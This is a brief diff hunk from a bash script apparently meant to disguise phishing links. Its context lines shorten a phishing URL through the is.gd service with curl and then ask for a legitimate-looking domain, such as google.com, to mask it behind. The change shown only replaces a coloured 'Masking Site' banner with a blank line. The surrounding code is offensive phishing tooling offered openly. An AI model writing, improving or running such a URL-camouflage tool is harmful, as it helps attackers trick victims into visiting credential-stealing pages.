@@ -22,7 +22,7 @@ echo "Please wait camouflage Phishing URL"
 echo ""
 short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
 shorter=${short#https://}
-echo -e "\n\e[1;31;42m ### Masking Site ###\e[0m"
+echo -e ""
 echo 'Domain to mask the Phishing URL (with http or https), ex: https://google.com, :'
 echo ""
 read mask
